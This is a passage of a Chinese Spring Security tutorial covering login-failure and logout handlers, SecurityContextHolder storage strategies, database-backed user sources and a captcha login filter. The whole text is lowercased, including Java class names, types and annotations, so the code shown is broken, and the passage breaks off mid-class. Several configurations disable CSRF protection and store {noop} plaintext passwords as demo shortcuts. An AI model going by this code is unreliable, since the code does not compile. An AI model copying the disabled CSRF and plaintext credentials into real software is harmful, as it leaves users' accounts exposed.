world</h1>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 1. 设置错误跳转页面\n\n跳转和成功跳转一样，分为\n\n * 重定向：错误信息存储到session域中，需要从session域取。\n * 转发：错误信息存储到request域中，需要从request域取。\n   * 在转发时需要注意，不能使用addviewcontroller，否则会报错，无法解析post请求。\n\n//                .failureurl("/index")  // 重定向\n.failureforwardurl("/login")  // 转发\n\n\n1\n2\n\n\n设置完成之后，登录失败就可以跳转到指定页面，并显示页面上的错误信息了。\n\n# 自定义认证失败处理器\n\n和上面的成功一样，为了配合前后端分离，登录失败也可以自定义失败处理器，返回一个json给前端。\n\n# 0. 自定义失败处理器\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.objectmapper;\nimport org.springframework.security.core.authenticationexception;\nimport org.springframework.security.web.authentication.authenticationfailurehandler;\n\nimport javax.servlet.servletexception;\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\nimport java.io.ioexception;\nimport java.util.hashmap;\n\npublic class customerauthenticationfailurehandler implements authenticationfailurehandler {\n    @override\n    public void onauthenticationfailure(httpservletrequest request, httpservletresponse response, authenticationexception exception) throws ioexception, servletexception {\n        hashmap<string, object> hashmap = new hashmap<>();\n        hashmap.put("msg","认证失败");\n        hashmap.put("code",400);\n        response.setcontenttype("application/json;charset=utf8");\n        string result = new objectmapper().writevalueasstring(hashmap);\n        response.getwriter().write(result);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 1. 配置认证失败处理器\n\n.failurehandler(new customerauthenticationfailurehandler())\n\n\n1\n\n\n\n# 自定义注销处理\n\nspring security 中也提供了默认的注销登录配置，在开发时也可以按照自己需求对注销进行个性化定制。默认的注销请求地址为/logout，因此只需要发送get请求到当前的地址即可完成注销。\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n  @override\n  protected void configure(httpsecurity http) throws exception {\n    http.authorizehttprequests()\n      //...\n      .and()\n      .formlogin()\n      //...\n      .and()\n      .logout()\n      .logouturl("/logout")\n      .invalidatehttpsession(true)\n      .clearauthentication(true)\n      .logoutsuccessurl("/login.html")\n      .and()\n      .csrf().disable();//这里先关闭 csrf\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * 通过 logout() 方法开启注销配置\n * logouturl 指定退出登录请求地址，默认是 get 请求，路径为 /logout\n * invalidatehttpsession 退出时是否是 session 失效，默认值为 true\n * clearauthentication 退出时是否清除认证信息，默认值为 true\n * logoutsuccessurl 退出登录时跳转地址\n\n同时，spring security也提供了个性化定制的可能，支持配置多个注销请求地址，和请求方式。同时为了更好的适配前后端分离的系统，支持自定义注销处理器。\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n\t\t@override\n    protected void configure(httpsecurity http) throws exception {\n        http.authorizehttprequests()\n                //...\n                .and()\n                .formlogin()\n                //...\n                .and()\n                .logout()\n                .logoutrequestmatcher(new orrequestmatcher(\n                        new antpathrequestmatcher("/logout1","get"),\n                        new antpathrequestmatcher("/logout","get")\n                ))\n                .invalidatehttpsession(true)\n                .clearauthentication(true)\n                .logoutsuccessurl("/login.html")\n                .and()\n                .csrf().disable();//这里先关闭 csrf\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 自定义注销处理器\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.objectmapper;\nimport org.springframework.security.core.authentication;\nimport org.springframework.security.web.authentication.logout.logoutsuccesshandler;\n\nimport javax.servlet.servletexception;\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\nimport java.io.ioexception;\nimport java.util.hashmap;\n\npublic class customerlogoutsuccesshandler implements logoutsuccesshandler {\n    @override\n    public void onlogoutsuccess(httpservletrequest request, httpservletresponse response, authentication authentication) throws ioexception, servletexception {\n        hashmap<string, object> hashmap = new hashmap<>();\n        hashmap.put("code",200);\n        hashmap.put("msg","注销成功！");\n        string re = new objectmapper().writevalueasstring(hashmap);\n        response.setcontenttype("application/json;charset=utf8");\n        response.getwriter().write(re);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n配置处理器\n\n.logoutsuccesshandler(new customerlogoutsuccesshandler())\n\n\n1\n\n\n\n# 登陆成功后的信息获取\n\n# securitycontextholder\n\nspring security 会将登录用户数据保存在 session 中。但是，为了使用方便,spring security在此基础上还做了一些改进，其中最主要的一个变化就是线程绑定。当用户登录成功后,spring security 会将登录成功的用户信息保存到 securitycontextholder 中。\n\nsecuritycontextholder 中的数据保存默认是通过threadlocal 来实现的，使用 threadlocal 创建的变量只能被当前线程访问，不能被其他线程访问和修改，也就是用户数据和请求线程绑定在一起。当登录请求处理完毕后，spring security 会将 securitycontextholder 中的数据拿出来保存到 session 中，同时将 securitycontexholder 中的数据清空。以后每当有请求到来时，spring security 就会先从 session 中取出用户登录数据，保存到securitycontextholder 中，方便在该请求的后续处理过程中使用，同时在请求结束时将 securitycontextholder 中的数据拿出来保存到 session 中，然后将securitycontextholder 中的数据清空。\n\n实际上 securitycontextholder 中存储是 securitycontext，在 securitycontext 中存储是 authentication。\n\n\n\n这种设计是典型的策略设计模式:\n\npublic class securitycontextholder {\n\tpublic static final string mode_threadlocal = "mode_threadlocal";\n\tpublic static final string mode_inheritablethreadlocal = "mode_inheritablethreadlocal";\n\tpublic static final string mode_global = "mode_global";\n\tprivate static final string mode_pre_initialized = "mode_pre_initialized";\n\tprivate static securitycontextholderstrategy strategy;\n  //....\n\tprivate static void initializestrategy() {\n\t\tif (mode_pre_initialized.equals(strategyname)) {\n\t\t\tassert.state(strategy != null, "when using " + mode_pre_initialized\n\t\t\t\t\t+ ", setcontextholderstrategy must be called with the fully constructed strategy");\n\t\t\treturn;\n\t\t}\n\t\tif (!stringutils.hastext(strategyname)) {\n\t\t\t// set default\n\t\t\tstrategyname = mode_threadlocal;\n\t\t}\n\t\tif (strategyname.equals(mode_threadlocal)) {\n\t\t\tstrategy = new threadlocalsecuritycontextholderstrategy();\n\t\t\treturn;\n\t\t}\n\t\tif (strategyname.equals(mode_inheritablethreadlocal)) {\n\t\t\tstrategy = new inheritablethreadlocalsecuritycontextholderstrategy();\n\t\t\treturn;\n\t\t}\n\t\tif (strategyname.equals(mode_global)) {\n\t\t\tstrategy = new globalsecuritycontextholderstrategy();\n\t\t\treturn;\n\t\t}\n    //.....\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n 1. mode threadlocal：这种存放策略是将 securitycontext 存放在 threadlocal中，大家知道 threadlocal 的特点是在哪个线程中存储就要在哪个线程中读取，这其实非常适合 web 应用，因为在默认情况下，一个请求无论经过多少 filter 到达 servlet，都是由一个线程来处理的。这也是 securitycontextholder 的默认存储策略，这种存储策略意味着如果在具体的业务处理代码中，开启了子线程，在子线程中去获取登录用户数据，就会获取不到。\n 2. mode inheritablethreadlocal：这种存储模式适用于多线程环境，如果希望在子线程中也能够获取到登录用户数据，那么可以使用这种存储模式。\n 3. mode global：这种存储模式实际上是将数据保存在一个静态变量中，在 javaweb开发中，这种模式很少使用到。\n\n# securitycontextholderstrategy\n\n通过 securitycontextholder 可以得知，securitycontextholderstrategy 接口用来定义存储策略方法\n\npublic interface securitycontextholderstrategy {\n\tvoid clearcontext();\n\tsecuritycontext getcontext();\n\tvoid setcontext(securitycontext context);\n\tsecuritycontext createemptycontext();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n接口中一共定义了四个方法：\n\n * clearcontext：该方法用来清除存储的 securitycontext对象。\n * getcontext：该方法用来获取存储的 securitycontext 对象。\n * setcontext：该方法用来设置存储的 securitycontext 对象。\n * create empty context：该方法则用来创建一个空的 securitycontext 对象。\n\n\n\n从上面可以看出每一个实现类对应一种策略的实现。\n\n# 代码中获取认证之后用户数据\n\n@restcontroller\npublic class hellocontroller {\n    @requestmapping("/hello")\n    public string hello() {\n      authentication authentication = securitycontextholder\n        .getcontext().getauthentication();\n      user principal = (user) authentication.getprincipal();\n      system.out.println("身份 :"+principal.getusername());\n      system.out.println("凭证 :"+authentication.getcredentials());\n      system.out.println("权限 :"+authentication.getauthorities());\n      return "hello security";\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 多线程情况下获取用户数据\n\n@restcontroller\npublic class hellocontroller {\n    @requestmapping("/hello")\n    public string hello() {\n      new thread(()->{\n        authentication authentication = securitycontextholder\n          .getcontext().getauthentication();\n        user principal = (user) authentication.getprincipal();\n        system.out.println("身份 :"+principal.getusername());\n        system.out.println("凭证 :"+authentication.getcredentials());\n        system.out.println("权限 :"+authentication.getauthorities());\n      }).start();\n      return "hello security";\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n\n可以看到默认策略，是无法在子线程中获取用户信息，如果需要在子线程中获取必须使用第二种策略，默认策略是通过 system.getproperty 加载的，因此我们可以通过增加 vm options 参数进行修改。\n\n-dspring.security.strategy=mode_inheritablethreadlocal\n\n\n1\n\n\n\n\n# 页面上获取用户信息\n\n * 引入依赖\n   \n   <dependency>\n     <groupid>org.thymeleaf.extras</groupid>\n     <artifactid>thymeleaf-extras-springsecurity5</artifactid>\n     <version>3.0.4.release</version>\n   </dependency>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n * 页面加入命名空间\n   \n   <html lang="en" xmlns:th="https://www.thymeleaf.org" \n   xmlns:sec="http://www.thymeleaf.org/extras/spring-security">\n   \n   \n   1\n   2\n   \n\n * 页面中使用\n   \n   \x3c!--获取认证用户名--\x3e\n   <ul>\n     <li sec:authentication="principal.username"></li>\n     <li sec:authentication="principal.authorities"></li>\n     <li sec:authentication="principal.accountnonexpired"></li>\n     <li sec:authentication="principal.accountnonlocked"></li>\n     <li sec:authentication="principal.credentialsnonexpired"></li>\n   </ul>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   \n\n\n# 自定义认证数据源\n\n# 认证流程分析\n\nhttps://docs.spring.io/spring-security/reference/servlet/authentication/architecture.html\n\n\n\n * 发起认证请求，请求中携带用户名、密码，该请求会被usernamepasswordauthenticationfilter 拦截\n * 在usernamepasswordauthenticationfilter的attemptauthentication方法中将请求中用户名和密码，封装为authentication对象，并交给authenticationmanager 进行认证\n * 认证成功，将认证信息存储到 securitycontexthodler 以及调用记住我等，并回调 authenticationsuccesshandler 处理\n * 认证失败，清除 securitycontexthodler 以及 记住我中信息，回调 authenticationfailurehandler 处理\n\n# 三者关系\n\n从上面分析中得知，authenticationmanager 是认证的核心类，但实际上在底层真正认证时还离不开 providermanager 以及 authenticationprovider 。他们三者关系是样的呢？\n\n * authenticationmanager 是一个认证管理器，它定义了 spring security 过滤器要执行认证操作。\n * providermanager authenticationmanager接口的实现类。spring security 认证时默认使用就是 providermanager。\n * authenticationprovider 就是针对不同的身份类型执行的具体的身份认证。\n\nauthenticationmanager 与 providermanager\n\n\n\nprovidermanager 是 authenticationmanager 的唯一实现，也是 spring security 默认使用实现。从这里不难看出默认情况下authenticationmanager 就是一个providermanager。\n\nprovidermanager 与 authenticationprovider\n\n摘自官方: https://docs.spring.io/spring-security/reference/servlet/authentication/architecture.html\n\n\n\n在 spring seourity 中，允许系统同时支持多种不同的认证方式，例如同时支持用户名/密码认证、reremberme 认证、手机号码动态认证等，而不同的认证方式对应了不同的authenticationprovider，所以一个完整的认证流程可能由多个authenticationprovider来提供。\n\n多个 authenticationprovider 将组成一个列表，这个列表将由 providermanager 代理。换句话说，在providermanager 中存在一个 authenticationprovider 列表，在provider manager 中遍历列表中的每一个authenticationprovider 去执行身份认证，最终得到认证结果。\n\nprovidermanager 本身也可以再配置一个 authenticationmanager作为 parent，这样当providermanager认证失败之后，就可以进入到 parent 中再次进行认证。理论上来说，providermanager 的 parent 可以是任意类型的authenticationmanager，但是通常都是由 providermanager来扮演 parent 的角色，也就是providermanager是 providermanager的 parent。\n\nprovidermanager本身也可以有多个，多个providermanager 共用同一个 parent。有时，一个应用程序有受保护资源的逻辑组（例如，所有符合路径模式的网络资源，如/api/**），每个组可以有自己的专用 authenticationmanager。通常，每个组都是一个providermanager，它们共享一个父级。然后，父级是一种 全局资源，作为所有提供者的后备资源。\n\n根据上面的介绍，我们绘出新的 authenticationmanager、providemanager 和 authentictionprovider关系\n\n摘自官网: https://spring.io/guides/topicals/spring-security-architecture\n\n\n\n弄清楚认证原理之后我们来看下具体认证时数据源的获取。**默认情况下 authenticationprovider 是由 daoauthenticationprovider 类来实现认证的，在daoauthenticationprovider 认证时又通过 userdetailsservice 完成数据源的校验。**他们之间调用关系如下：\n\n\n\n总结: authenticationmanager 是认证管理器，在 spring security 中有全局authenticationmanager，也可以有局部authenticationmanager。全局的authenticationmanager用来对全局认证进行处理，局部的authenticationmanager用来对某些特殊资源认证处理。当然无论是全局认证管理器还是局部认证管理器都是由 providermanger 进行实现。 每一个providermanger中都代理一个authenticationprovider的列表，列表中每一个实现代表一种身份认证方式。认证时底层数据源需要调用 userdetailservice 来实现。\n\n# 配置全局 authenticationmanager\n\nhttps://spring.io/guides/topicals/spring-security-architecture\n\n默认的全局 authenticationmanager\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n  @autowired\n  public void initialize(authenticationmanagerbuilder builder) {\n    //builder..\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * springboot 对 security 进行自动配置时自动在工厂中创建一个全局authenticationmanager\n\n总结\n\n 1. 默认自动配置创建全局authenticationmanager 默认找当前项目中是否存在自定义 userdetailservice 实例 自动将当前项目 userdetailservice 实例设置为数据源\n 2. 默认自动配置创建全局authenticationmanager 在工厂中使用时直接在代码中注入即可\n\n自定义全局 authenticationmanager\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n  @override\n  public void configure(authenticationmanagerbuilder builder) {\n  \t//builder ....\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n总结\n\n 1. 会将工厂中自动配置authenticationmanager 进行覆盖\n 2. 需要在实现中指定认证数据源对象 userdetaiservice 实例\n 3. 这种方式创建authenticationmanager对象工厂内部本地一个 authenticationmanager 对象 不允许在其他自定义组件中进行注入\n\n用来在工厂中暴露自定义authenticationmanager 实例\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n  \n    //1.自定义authenticationmanager  推荐  并没有在工厂中暴露出来\n    @override\n    public void configure(authenticationmanagerbuilder builder) throws exception {\n        system.out.println("自定义authenticationmanager: " + builder);\n        builder.userdetailsservice(userdetailsservice());\n    }\n\n    //作用: 用来将自定义authenticationmanager在工厂中进行暴露,可以在任何位置注入\n    @override\n    @bean\n    public authenticationmanager authenticationmanagerbean() throws exception {\n        return super.authenticationmanagerbean();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 自定义内存数据源\n\n@configuration\npublic class websecurityconfigurer extends websecurityconfigureradapter {\n\n    @bean\n    public userdetailsservice userdetailsservice(){\n        inmemoryuserdetailsmanager inmemoryuserdetailsmanager\n                = new inmemoryuserdetailsmanager();\n        userdetails u1 = user.withusername("zhangs")\n                .password("{noop}111").roles("user").build();\n        inmemoryuserdetailsmanager.createuser(u1);\n        return inmemoryuserdetailsmanager;\n    }\n\n    @override\n    protected void configure(authenticationmanagerbuilder auth) \n      throws exception {\n        auth.userdetailsservice(userdetailsservice());\n    }  \t\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 自定义数据库数据源\n\n数据库数据表设计\n\n-- 用户表\ncreate table `user`\n(\n    `id`                    int(11) not null auto_increment,\n    `username`              varchar(32)  default null,\n    `password`              varchar(255) default null,\n    `enabled`               tinyint(1) default null,\n    `accountnonexpired`     tinyint(1) default null,\n    `accountnonlocked`      tinyint(1) default null,\n    `credentialsnonexpired` tinyint(1) default null,\n    primary key (`id`)\n) engine=innodb auto_increment=4 default charset=utf8;\n-- 角色表\ncreate table `role`\n(\n    `id`      int(11) not null auto_increment,\n    `name`    varchar(32) default null,\n    `name_zh` varchar(32) default null,\n    primary key (`id`)\n) engine=innodb auto_increment=4 default charset=utf8;\n-- 用户角色关系表\ncreate table `user_role`\n(\n    `id`  int(11) not null auto_increment,\n    `uid` int(11) default null,\n    `rid` int(11) default null,\n    primary key (`id`),\n    key   `uid` (`uid`),\n    key   `rid` (`rid`)\n) engine=innodb auto_increment=5 default charset=utf8;\n\n-- 插入用户数据\nbegin;\n  insert into `user`\n  values (1, \'root\', \'{noop}123\', 1, 1, 1, 1);\n  insert into `user`\n  values (2, \'admin\', \'{noop}123\', 1, 1, 1, 1);\n  insert into `user`\n  values (3, \'blr\', \'{noop}123\', 1, 1, 1, 1);\ncommit;\n-- 插入角色数据\nbegin;\n  insert into `role`\n  values (1, \'role_product\', \'商品管理员\');\n  insert into `role`\n  values (2, \'role_admin\', \'系统管理员\');\n  insert into `role`\n  values (3, \'role_user\', \'用户管理员\');\ncommit;\n-- 插入用户角色数据\nbegin;\n  insert into `user_role`\n  values (1, 1, 1);\n  insert into `user_role`\n  values (2, 1, 2);\n  insert into `user_role`\n  values (3, 2, 2);\n  insert into `user_role`\n  values (4, 3, 3);\ncommit;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n创建对应的实体类对象\n\npackage com.pwddd.springsecurity.entity;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\nimport org.springframework.security.core.grantedauthority;\nimport org.springframework.security.core.authority.simplegrantedauthority;\nimport org.springframework.security.core.userdetails.userdetails;\n\nimport java.util.arraylist;\nimport java.util.collection;\nimport java.util.list;\n\n@data\n@allargsconstructor\n@noargsconstructor\npublic class user implements userdetails {\n    private integer id;\n    private string username;\n    private string password;\n    private boolean enabled;\n    private boolean accountnonexpired;\n    private boolean accountnonlocked;\n    private boolean credentialsnonexpired;\n    private list<role> roles = new arraylist<>();\n\n    @override\n    public collection<? extends grantedauthority> getauthorities() {\n        list<grantedauthority> grantedauthorities = new arraylist<>();\n        roles.foreach(role->grantedauthorities.add(new simplegrantedauthority(role.getname())));\n        return grantedauthorities;\n    }\n\n    @override\n    public string getpassword() {\n        return password;\n    }\n\n    @override\n    public string getusername() {\n        return username;\n    }\n\n    @override\n    public boolean isaccountnonexpired() {\n        return accountnonexpired;\n    }\n\n    @override\n    public boolean isaccountnonlocked() {\n        return accountnonlocked;\n    }\n\n    @override\n    public boolean iscredentialsnonexpired() {\n        return credentialsnonexpired;\n    }\n\n    @override\n    public boolean isenabled() {\n        return enabled;\n    }\n\t\t//get/set....\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n角色对象\n\npackage com.pwddd.springsecurity.entity;\n\nimport lombok.*;\nimport org.springframework.context.annotation.scope;\n\n@data\n@allargsconstructor\n@noargsconstructor\npublic class role {\n    private integer id;\n    private string name;\n    private string namezh;\n  \t//get set..\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n创建对应的service\n\npackage com.pwddd.springsecurity.service.impl;\n\nimport com.pwddd.springsecurity.entity.user;\nimport com.pwddd.springsecurity.mapper.usermapper;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.security.core.userdetails.userdetails;\nimport org.springframework.security.core.userdetails.userdetailsservice;\nimport org.springframework.security.core.userdetails.usernamenotfoundexception;\nimport org.springframework.stereotype.service;\nimport org.springframework.util.objectutils;\n\n@service\npublic class userserviceimpl implements userdetailsservice {\n    @autowired\n    private  usermapper userdao;\n\n\n    @override\n    public userdetails loaduserbyusername(string username) throws usernamenotfoundexception {\n        user user = userdao.loaduserbyusername(username);\n        if(objectutils.isempty(user))throw new runtimeexception("用户不存在");\n        user.setroles(userdao.getrolesbyuid(user.getid()));\n        return user;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n使用该service\n\n@autowired\nprivate userserviceimpl userservice;\n\n\n\n@override\nprotected void configure(authenticationmanagerbuilder builder) throws exception {\n  builder.userdetailsservice(userservice);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 验证码案例\n\n# 传统web案例\n\n 0. 创建一个新项目，引入web相关依赖，测试环境。引入spring security使用默认拦截测试。\n\n 1. 自定义springsecurity配置。\n\n   package com.pwddd.web.conf;\n   \n   import org.springframework.context.annotation.configuration;\n   import org.springframework.security.config.annotation.web.builders.httpsecurity;\n   import org.springframework.security.config.annotation.web.configuration.websecurityconfigureradapter;\n   \n   @configuration\n   public class securityconfig extends websecurityconfigureradapter {\n     @override\n     protected void configure(httpsecurity http) throws exception {\n       http.authorizerequests()\n         //                .mvcmatchers("/test").permitall()\n         .mvcmatchers("/login").permitall()\n         .mvcmatchers("/dologin").permitall()\n         .anyrequest().authenticated()\n         .and()\n         .formlogin()\n         .loginpage("/login")\n         .defaultsuccessurl("/index")\n         .failureurl("/login")\n         .usernameparameter("uname")\n         .passwordparameter("passwd")\n         .loginprocessingurl("/dologin")\n         .and().csrf().disable();\n     }\n   }\n   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n 2. 自定义数据源\n\n   package com.pwddd.web.service;\n   \n   import com.pwddd.web.entity.user;\n   import com.pwddd.web.mapper.usermapper;\n   import org.springframework.beans.factory.annotation.autowired;\n   import org.springframework.security.core.userdetails.userdetails;\n   import org.springframework.security.core.userdetails.userdetailsservice;\n   import org.springframework.security.core.userdetails.usernamenotfoundexception;\n   import org.springframework.stereotype.component;\n   import org.springframework.stereotype.service;\n   \n   @service\n   public class userservice implements userdetailsservice {\n   \n       private final usermapper usermapper;\n   \n       public userservice(usermapper usermapper) {\n           this.usermapper = usermapper;\n       }\n   \n       @override\n       public userdetails loaduserbyusername(string username) throws usernamenotfoundexception {\n           user user = usermapper.loaduserbyusername(username);\n           system.out.println(user);\n           if (user == null) throw new usernamenotfoundexception("用户名不正确");\n           return user;\n       }\n   }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n   package com.pwddd.web.conf;\n   \n   import com.pwddd.web.service.userservice;\n   import org.springframework.context.annotation.configuration;\n   import org.springframework.security.config.annotation.authentication.builders.authenticationmanagerbuilder;\n   import org.springframework.security.config.annotation.web.builders.httpsecurity;\n   import org.springframework.security.config.annotation.web.configuration.websecurityconfigureradapter;\n   import org.springframework.security.core.userdetails.userdetailsservice;\n   \n   @configuration\n   public class securityconfig extends websecurityconfigureradapter {\n   \n       private final userservice userservice;\n   \n       public securityconfig(userservice userservice) {\n           this.userservice = userservice;\n       }\n   \n       @override\n       protected userdetailsservice userdetailsservice() {\n           return userservice;\n       }\n   \n       @override\n       protected void configure(authenticationmanagerbuilder auth) throws exception {\n           auth.userdetailsservice(userdetailsservice());\n       }\n   \n       @override\n       protected void configure(httpsecurity http) throws exception {\n           http.authorizerequests()\n   //                .mvcmatchers("/test").permitall()\n                   .mvcmatchers("/login").permitall()\n                   .mvcmatchers("/dologin").permitall()\n                   .anyrequest().authenticated()\n                   .and()\n                   .formlogin()\n                   .loginpage("/login")\n                   .defaultsuccessurl("/index")\n                   .failureurl("/login")\n                   .usernameparameter("uname")\n                   .passwordparameter("passwd")\n                   .loginprocessingurl("/dologin")\n                   .and().csrf().disable();\n       }\n   }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n 3. 生成验证码\n\n<dependency>\n  <groupid>com.github.penggle</groupid>\n  <artifactid>kaptcha</artifactid>\n  <version>2.3.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\npackage com.pwddd.web.conf;\n\nimport com.google.code.kaptcha.producer;\nimport com.google.code.kaptcha.impl.defaultkaptcha;\nimport com.google.code.kaptcha.util.config;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport java.util.properties;\n\n@configuration\npublic class kaptchaconfig {\n\n  @bean\n  public producer kaptcha() {\n    properties properties = new properties();\n    properties.setproperty("kaptcha.image.width", "150");\n    properties.setproperty("kaptcha.image.height", "50");\n\n    properties.setproperty("kaptcha.textproducer.char.string", "0123456789");\n    properties.setproperty("kaptcha.textproducer.char.length", "4");\n    config config = new config(properties);\n    defaultkaptcha defaultkaptcha = new defaultkaptcha();\n    defaultkaptcha.setconfig(config);\n    return defaultkaptcha;\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n生成验证码\n\n@requestmapping("/code")\npublic void verify(httpservletresponse resp, httpsession session) throws ioexception {\n  resp.setcontenttype("image/png");\n  string code = producer.createtext();\n  session.setattribute("code",code);\n  bufferedimage image = producer.createimage(code);\n  servletoutputstream outputstream = resp.getoutputstream();\n  imageio.write(image,"png",outputstream);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n添加到页面\n\n验证码： <input type="text" name="code"> <img th:src="@{/code}" alt="验证码" /> <br>\n\n\n1\n\n\n自定义验证码异常\n\npackage com.pwddd.web.ex;\n\n\nimport org.springframework.security.core.authenticationexception;\n\npublic class captchanotmatchexception extends authenticationexception {\n  public captchanotmatchexception(string msg) {\n    super(msg);\n  }\n\n  public captchanotmatchexception(string msg, throwable cause) {\n    super(msg, cause);\n  }\n\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n处理携带验证码的请求，自定义filter\n\npackage com.pwddd.web.filter;\n\nimport com.pwddd.web.ex.captchanotmatchexception;\nimport org.springframework.security.core.authentication;\nimport org.springframework.security.core.authenticationexception;\nimport org.springframework.security.web.authentication.usernamepasswordauthenticationfilter;\nimport org.springframework.util.objectutils;\n\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\n\npublic class customerfilter extends usernamepasswordauthenticationfilter {\n  public static final string spring_security_form_code_key = "code";\n  private string codeparameter = spring_security_form_code_key;\n\n  public string getcodeparameter() {\n    return codeparameter;\n  }\n\n  public void setcodeparameter(string codeparameter) {\n    this.codeparameter = codeparameter;\n  }\n\n  @override\n  public authentication attemptauthentication(httpservletrequest request, httpservletresponse response) throws authenticationexception {\n\n    string code = request.getparameter(getcodeparameter());\n    string sessioncode = (string) request.getsession().getattribute(getcodeparameter());\n    if (!objectutils.isempty(code)\n        && !objectutils.isempty(sessioncode)\n        && code.equals(sessioncode)\n       ){\n      return super.attemptauthentication(request,response);\n    }\n    throw new captchanotmatchexception("验证码错误");\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n替换掉默认的usernamepasswordauthenticationfilter\n\npackage com.pwddd.web.config;\n\nimport com.pwddd.web.filter.imagecodefilter;\nimport com.pwddd.web.service.userservice;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.security.config.annotation.authentication.builders.authenticationmanagerbuilder;\nimport org.springframework.security.config.annotation.web.builders.httpsecurity;\nimport org.springframework.security.config.annotation.web.configuration.websecurityconfigureradapter;\nimport org.springframework.security.core.userdetails.userdetailsservice;\nimport org.springframework.security.web.authentication.usernamepasswordauthenticationfilter;\n\n@configuration\npublic class securityconfig extends websecurityconfigureradapter {\n\n  private final userservice userservice;\n\n  public securityconfig(userservice userservice) {\n    this.userservice = userservice;\n  }\n\n  @override\n  protected void configure(authenticationmanagerbuilder auth) throws exception {\n    auth.userdetailsservice(userdetailsservice());\n  }\n\n  @override\n  protected userdetailsservice userdetailsservice() {\n    return userservice;\n  }\n\n  @bean\n  imagecodefilter imagecodefilter() throws exception {\n    